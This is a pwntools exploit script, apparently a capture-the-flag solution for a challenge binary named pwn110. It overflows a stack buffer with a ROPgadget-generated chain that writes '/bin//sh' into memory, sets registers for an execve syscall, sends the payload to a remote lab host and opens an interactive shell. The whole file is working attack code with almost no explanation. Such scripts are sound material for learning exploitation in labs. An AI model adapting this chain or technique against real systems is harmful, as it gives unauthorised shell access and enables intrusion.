# final challenge is a no-pie, nx enabled rop chain challenge
# reasonably trivial if you use a generated rop chain, more challenging if not

from pwn import *

current_thmip = '10.10.193.93'

p = process("./pwn110.pwn110")
p = remote(current_thmip, 9010)
context.arch = "amd64"

payload = flat(
    b'A'*40,

    # below generated with `ROPgadget --binary pwn110.pwn110 --ropchain``

    0x40f4de, # pop rsi ; ret
    0x4c00e0, # @ .data
    0x4497d7, # pop rax ; ret
    b'/bin//sh',
    0x47bcf5, # mov qword ptr [rsi], rax ; ret
    0x40f4de, # pop rsi ; ret
    0x4c00e8, # @ .data + 8
    0x443e30, # xor rax, rax ; ret
    0x47bcf5, # mov qword ptr [rsi], rax ; ret
    0x40191a, # pop rdi ; ret
    0x4c00e0, # @ .data
    0x40f4de, # pop rsi ; ret
    0x4c00e8, # @ .data + 8
    0x40181f, # pop rdx ; ret
    0x4c00e8, # @ .data + 8
    0x443e30, # xor rax, rax ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x470d20, # add rax, 1 ; ret
    0x4012d3, # syscall
)

p.clean()
p.sendline(payload)

p.interactive()
